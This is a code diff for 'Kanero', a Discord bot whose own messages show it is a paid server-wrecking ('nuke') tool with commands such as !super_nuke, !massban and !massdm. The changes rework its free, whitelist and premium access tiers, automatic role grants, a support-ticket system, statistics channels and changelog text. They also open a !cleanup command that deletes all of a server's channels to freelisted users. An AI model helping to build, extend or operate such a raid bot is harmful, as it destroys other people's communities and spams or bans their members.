@@ -107,7 +107,8 @@ last_nuke_time = {}  # guild_id -> время последнего nuke
 
 
 def is_whitelisted(user_id):
-    return user_id in config.WHITELIST
+    # Premium тоже считается whitelist
+    return user_id in config.WHITELIST or user_id in PREMIUM_LIST or user_id == config.OWNER_ID
 
 
 def is_owner_whitelisted(user_id):
@@ -115,7 +116,7 @@ def is_owner_whitelisted(user_id):
 
 
 def is_premium(user_id):
-    return user_id in PREMIUM_LIST
+    return user_id in PREMIUM_LIST or user_id == config.OWNER_ID
 
 
 
@@ -169,7 +170,8 @@ def save_freelist():
 
 
 def is_freelisted(user_id):
-    return user_id in FREELIST
+    # Whitelist и Premium тоже включают freelist
+    return user_id in FREELIST or user_id in config.WHITELIST or user_id in PREMIUM_LIST or user_id == config.OWNER_ID
 
 
 def save_blocked_guilds():
@@ -572,8 +574,17 @@ async def stop(ctx):
 
 
 @bot.command()
-@wl_check()
 async def cleanup(ctx):
+    uid = ctx.author.id
+    if not is_freelisted(uid):
+        embed = discord.Embed(
+            title="☠️ ДОСТУП ЗАПРЕЩЁН",
+            description="Для `!cleanup` нужна регистрация.\nНапиши в #addbot: https://discord.gg/XpNZAwh4",
+            color=0x0a0a0a
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed)
+        return
     await delete_all_channels(ctx.guild)
     overwrites = {
         ctx.guild.default_role: discord.PermissionOverwrite(
@@ -699,7 +710,18 @@ async def wl_add(ctx, user_id: int):
     if user_id not in config.WHITELIST:
         config.WHITELIST.append(user_id)
         save_whitelist()
-        await ctx.send(f"✅ `{user_id}` добавлен.")
+        # Выдаём роль ✅ White на домашнем сервере
+        try:
+            home_guild = bot.get_guild(HOME_GUILD_ID)
+            if home_guild:
+                member = home_guild.get_member(user_id) or await home_guild.fetch_member(user_id)
+                if member:
+                    role = discord.utils.find(lambda r: r.name == "✅ White", home_guild.roles)
+                    if role:
+                        await member.add_roles(role, reason="wl_add")
+        except Exception:
+            pass
+        await ctx.send(f"✅ `{user_id}` добавлен в whitelist + выдана роль **✅ White**.")
     else:
         await ctx.send("Уже в whitelist.")
 
@@ -710,7 +732,19 @@ async def wl_remove(ctx, user_id: int):
     if user_id in config.WHITELIST:
         config.WHITELIST.remove(user_id)
         save_whitelist()
-        await ctx.send(f"✅ `{user_id}` убран.")
+        # Забираем роль ✅ White (если не premium)
+        try:
+            if user_id not in PREMIUM_LIST:
+                home_guild = bot.get_guild(HOME_GUILD_ID)
+                if home_guild:
+                    member = home_guild.get_member(user_id)
+                    if member:
+                        role = discord.utils.find(lambda r: r.name == "✅ White", home_guild.roles)
+                        if role and role in member.roles:
+                            await member.remove_roles(role, reason="wl_remove")
+        except Exception:
+            pass
+        await ctx.send(f"✅ `{user_id}` убран из whitelist.")
     else:
         await ctx.send("Не найден.")
 
@@ -742,11 +776,31 @@ async def pm_add(ctx, user_id: int):
     if user_id not in PREMIUM_LIST:
         PREMIUM_LIST.append(user_id)
         save_premium()
-    # Автоматически добавляем в whitelist
     if user_id not in config.WHITELIST:
         config.WHITELIST.append(user_id)
         save_whitelist()
-    await ctx.send(f"💎 `{user_id}` получил **Premium** + добавлен в **Whitelist**.")
+    # Убираем из freelist если был там
+    if user_id in FREELIST:
+        FREELIST.remove(user_id)
+        save_freelist()
+    # Выдаём роль 💎 Premium на домашнем сервере
+    try:
+        home_guild = bot.get_guild(HOME_GUILD_ID)
+        if home_guild:
+            member = home_guild.get_member(user_id) or await home_guild.fetch_member(user_id)
+            if member:
+                prem_role = discord.utils.find(lambda r: r.name == "💎 Premium", home_guild.roles)
+                white_role = discord.utils.find(lambda r: r.name == "✅ White", home_guild.roles)
+                user_role  = discord.utils.find(lambda r: r.name == "👥 User",  home_guild.roles)
+                roles_to_add = [r for r in [prem_role, white_role] if r and r not in member.roles]
+                roles_to_remove = [r for r in [user_role] if r and r in member.roles]
+                if roles_to_add:
+                    await member.add_roles(*roles_to_add, reason="pm_add")
+                if roles_to_remove:
+                    await member.remove_roles(*roles_to_remove, reason="pm_add — upgrade to premium")
+    except Exception:
+        pass
+    await ctx.send(f"💎 `{user_id}` получил **Premium** + роль **💎 Premium** выдана.")
 
 
 @bot.command(name="pm_remove")
@@ -756,7 +810,18 @@ async def pm_remove(ctx, user_id: int):
     if user_id in PREMIUM_LIST:
         PREMIUM_LIST.remove(user_id)
         save_premium()
-        await ctx.send(f"✅ `{user_id}` убран из Premium. Whitelist не тронут.")
+        # Забираем роль 💎 Premium
+        try:
+            home_guild = bot.get_guild(HOME_GUILD_ID)
+            if home_guild:
+                member = home_guild.get_member(user_id)
+                if member:
+                    role = discord.utils.find(lambda r: r.name == "💎 Premium", home_guild.roles)
+                    if role and role in member.roles:
+                        await member.remove_roles(role, reason="pm_remove")
+        except Exception:
+            pass
+        await ctx.send(f"✅ `{user_id}` убран из Premium. Whitelist сохранён.")
     else:
         await ctx.send("Не найден в Premium.")
 
@@ -778,11 +843,14 @@ async def list_cmd(ctx):
 
     embed = discord.Embed(title="📋 Списки Kanero", color=0x0a0a0a)
     protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
+    # Freelist — только те кто НЕ в whitelist и НЕ в premium
+    fl_only = [uid for uid in FREELIST if uid not in config.WHITELIST and uid not in PREMIUM_LIST]
+    # Whitelist — только те кто НЕ в premium и НЕ в owner whitelist
     wl_only = [uid for uid in config.WHITELIST if uid not in PREMIUM_LIST and uid not in protected]
-    embed.add_field(name=f"📋 Freelist ({len(FREELIST)})",        value=await fmt(FREELIST),              inline=False)
-    embed.add_field(name=f"✅ Whitelist ({len(wl_only)})",         value=await fmt(wl_only),               inline=False)
-    embed.add_field(name=f"💎 Premium ({len(PREMIUM_LIST)})",      value=await fmt(PREMIUM_LIST),          inline=False)
-    embed.add_field(name=f"👑 Owner Whitelist ({len(config.OWNER_WHITELIST)})", value=await fmt(config.OWNER_WHITELIST), inline=False)
+    embed.add_field(name=f"📋 Freelist ({len(fl_only)})",                        value=await fmt(fl_only),              inline=False)
+    embed.add_field(name=f"✅ Whitelist ({len(wl_only)})",                        value=await fmt(wl_only),              inline=False)
+    embed.add_field(name=f"💎 Premium ({len(PREMIUM_LIST)})",                     value=await fmt(PREMIUM_LIST),         inline=False)
+    embed.add_field(name=f"👑 Owner Whitelist ({len(config.OWNER_WHITELIST)})",   value=await fmt(config.OWNER_WHITELIST), inline=False)
     embed.add_field(
         name="📌 Управление",
         value=(
@@ -1141,6 +1209,12 @@ async def setup(ctx):
         role_user: _ow(True, True), role_white: _ow(True, True),
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
     }, topic="Предложения и идеи для улучшения бота")
+    # 🎫 create-ticket — виден всем Guest+, кнопка создаёт приватный канал
+    ticket_ch = await guild.create_text_channel("🎫・create-ticket", category=cat_chat, overwrites={
+        guild.default_role: _ow(), role_guest: _ow(True, False),
+        role_user: _ow(True, False), role_white: _ow(True, False),
+        role_premium: _ow(True, False), role_owner: _ow(True, True), role_dev: _ow(True, True),
+    }, topic="Нажми кнопку чтобы создать тикет поддержки")
 
     # ━━ 📋 FREELIST — User+ ━━
     cat_free = await guild.create_category("━━━━ 📋 FREELIST ━━━━", overwrites={
@@ -1194,7 +1268,38 @@ async def setup(ctx):
         role_premium: _ow(True, True), role_owner: _ow(True, True), role_dev: _ow(True, True),
     }, topic="!super_nuke, !massban, !massdm, !auto_super_nuke и другие Premium команды")
 
-    # ━━ 🔊 ВОЙСЫ ━━
+    # ━━ 📊 СТАТИСТИКА (самый верх, никто не заходит — только смотрят) ━━
+    # Все видят, никто не заходит — используется как счётчики
+    no_connect = discord.PermissionOverwrite(connect=False, view_channel=True)
+    cat_stats = await guild.create_category("━━━━ 📊 СТАТИСТИКА ━━━━", overwrites={
+        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=True),
+        role_guest:  no_connect, role_user:   no_connect,
+        role_white:  no_connect, role_premium:no_connect,
+        role_owner:  no_connect, role_dev:    no_connect,
+    })
+    total_members = guild.member_count
+    guest_count   = sum(1 for m in guild.members if role_guest   in m.roles)
+    user_count    = sum(1 for m in guild.members if role_user    in m.roles)
+    white_count   = sum(1 for m in guild.members if role_white   in m.roles)
+    premium_count = sum(1 for m in guild.members if role_premium in m.roles)
+    # Каналы-счётчики — никто не может зайти, все видят
+    await guild.create_voice_channel(f"🔊 all • {total_members}", category=cat_stats, overwrites={
+        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=True),
+    })
+    await guild.create_voice_channel(f"👤 guest • {guest_count}", category=cat_stats, overwrites={
+        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=True),
+    })
+    await guild.create_voice_channel(f"👥 users • {user_count}", category=cat_stats, overwrites={
+        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=True),
+    })
+    await guild.create_voice_channel(f"✅ whitelist • {white_count}", category=cat_stats, overwrites={
+        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=True),
+    })
+    await guild.create_voice_channel(f"💎 premium • {premium_count}", category=cat_stats, overwrites={
+        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=True),
+    })
+
+    # ━━ 🔊 ВОЙСЫ — обычные каналы для общения ━━
     cat_voice = await guild.create_category("━━━━ 🔊 ВОЙСЫ ━━━━", overwrites={
         guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
         role_guest:  discord.PermissionOverwrite(connect=False, view_channel=True),
@@ -1204,53 +1309,9 @@ async def setup(ctx):
         role_owner:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
         role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
     })
-    # 🔊 all — все могут зайти (даже @everyone видит)
-    await guild.create_voice_channel("🔊 all", category=cat_voice, overwrites={
-        guild.default_role: discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_guest:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_user:   discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_white:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_premium:discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_owner:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-    })
-    # Считаем участников по ролям для названий
-    guest_count   = sum(1 for m in guild.members if role_guest   in m.roles)
-    user_count    = sum(1 for m in guild.members if role_user    in m.roles)
-    white_count   = sum(1 for m in guild.members if role_white   in m.roles)
-    premium_count = sum(1 for m in guild.members if role_premium in m.roles)
-    # 👤 guest — только Guest+ видит, не может зайти
-    await guild.create_voice_channel(f"👤 guest • {guest_count}", category=cat_voice, overwrites={
-        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_guest:  discord.PermissionOverwrite(connect=False, view_channel=True),
-        role_user:   discord.PermissionOverwrite(connect=False, view_channel=True),
-        role_white:  discord.PermissionOverwrite(connect=False, view_channel=True),
-        role_premium:discord.PermissionOverwrite(connect=False, view_channel=True),
-        role_owner:  discord.PermissionOverwrite(connect=True,  view_channel=True),
-        role_dev:    discord.PermissionOverwrite(connect=True,  view_channel=True),
-    })
-    # 👥 users — User+ видит
-    await guild.create_voice_channel(f"👥 users • {user_count}", category=cat_voice, overwrites={
-        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_guest:  discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_user:   discord.PermissionOverwrite(connect=False, view_channel=True),
-        role_white:  discord.PermissionOverwrite(connect=False, view_channel=True),
-        role_premium:discord.PermissionOverwrite(connect=False, view_channel=True),
-        role_owner:  discord.PermissionOverwrite(connect=True,  view_channel=True),
-        role_dev:    discord.PermissionOverwrite(connect=True,  view_channel=True),
-    })
-    # ✅ whitelist — White+ заходит
-    await guild.create_voice_channel(f"✅ whitelist • {white_count}", category=cat_voice, overwrites={
-        guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_guest:  discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_user:   discord.PermissionOverwrite(connect=False, view_channel=False),
-        role_white:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_premium:discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_owner:  discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-        role_dev:    discord.PermissionOverwrite(connect=True, speak=True, view_channel=True),
-    })
-    # 💎 premium — только Premium+
-    await guild.create_voice_channel(f"💎 premium • {premium_count}", category=cat_voice, user_limit=20, overwrites={
+    for i in range(1, 4):
+        await guild.create_voice_channel(f"🔊 voice-{i}", category=cat_voice, user_limit=10)
+    await guild.create_voice_channel("💎 premium-voice", category=cat_voice, user_limit=20, overwrites={
         guild.default_role: discord.PermissionOverwrite(connect=False, view_channel=False),
         role_guest:  discord.PermissionOverwrite(connect=False, view_channel=False),
         role_user:   discord.PermissionOverwrite(connect=False, view_channel=False),
@@ -1308,6 +1369,21 @@ async def setup(ctx):
     a.set_footer(text="☠️ Kanero  |  Просто напиши что-нибудь")
     await addbot_ch.send(embed=a)
 
+    # Тикеты — отправляем кнопку в create-ticket
+    ticket_embed = discord.Embed(
+        title="🎫 Поддержка — Kanero",
+        description=(
+            "Нужна помощь? Есть вопрос?\n\n"
+            "Нажми кнопку ниже — бот создаст приватный канал только для тебя и администрации.\n\n"
+            "• Вопросы по боту\n"
+            "• Покупка White / Premium\n"
+            "• Жалобы и предложения"
+        ),
+        color=0x0a0a0a
+    )
+    ticket_embed.set_footer(text="☠️ Kanero  |  Один тикет на пользователя")
+    await ticket_ch.send(embed=ticket_embed, view=TicketOpenView())
+
     await logs_ch.send(embed=discord.Embed(
         title="📊 Логи — Kanero",
         description="`!nukelogs` — логи нюков\n`!list` — whitelist/premium\n`!fl_list` — freelist\n`!auto_info` — статус авто нюков",
@@ -1325,7 +1401,8 @@ async def setup(ctx):
             "📋 FREELIST: freelist-chat · помощь (User+)\n"
             "✅ WHITE: white-chat · команды (White+)\n"
             "💎 PREMIUM: premium-chat · premium-info · premium-tools (Premium+)\n"
-            "🔊 ВОЙСЫ: voice-1/2/3 · premium-voice · admin-voice\n"
+            "� СТАТИСТИКА: all • guest • users • whitelist • premium (счётчики, зайти нельзя)\n"
+            "�🔊 ВОЙСЫ: voice-1/2/3 · premium-voice · admin-voice\n"
             "👑 ADMIN: logs · bot-commands · lists (Owner+)\n\n"
             f"Авто-роль при входе: <@&{AUTO_ROLE_ID}>\n"
             "Роль 👥 User выдаётся при написании в addbot."
@@ -2132,6 +2209,8 @@ async def changelog(ctx):
         value=(
             "**Структура сервера:**\n"
             "• Новые категории: FREELIST · WHITE · PREMIUM (у каждого свои каналы)\n"
+            "• Категория СТАТИСТИКА — счётчики участников по ролям (зайти нельзя)\n"
+            "• Тикет система — кнопка в #create-ticket создаёт приватный канал\n"
             "• Роль **👥 User** — выдаётся авто при написании в #addbot\n"
             "• Роль **🎬 Media** — только она пишет в #медиа\n"
             "• Welcome канал — виден всем, бот пишет при входе\n"
@@ -2171,12 +2250,13 @@ async def changelogall(ctx):
         name="🔥🔥 v2.0 — ПОЛНЫЙ РЕДИЗАЙН",
         value=(
             "• Новые категории: FREELIST · WHITE · PREMIUM\n"
+            "• Категория СТАТИСТИКА — счётчики по ролям\n"
+            "• Тикет система — кнопка в #create-ticket\n"
             "• Роль 👥 User (авто при freelist) · 🎬 Media\n"
-            "• Welcome канал + авто-роль при входе\n"
-            "• `!nuke`/`!auto_nuke` требуют freelist\n"
-            "• Реклама → https://discord.gg/XpNZAwh4\n"
-            "• Порядок ролей исправлен\n"
-            "• Новости/партнёрство — только Owner пишет"
+            "• !wl_add/pm_add авто выдают роли на сервере\n"
+            "• !cleanup доступен freelist+\n"
+            "• Реклама убрана из нюков\n"
+            "• Ссылка → https://discord.gg/XpNZAwh4"
         ),
         inline=False
     )
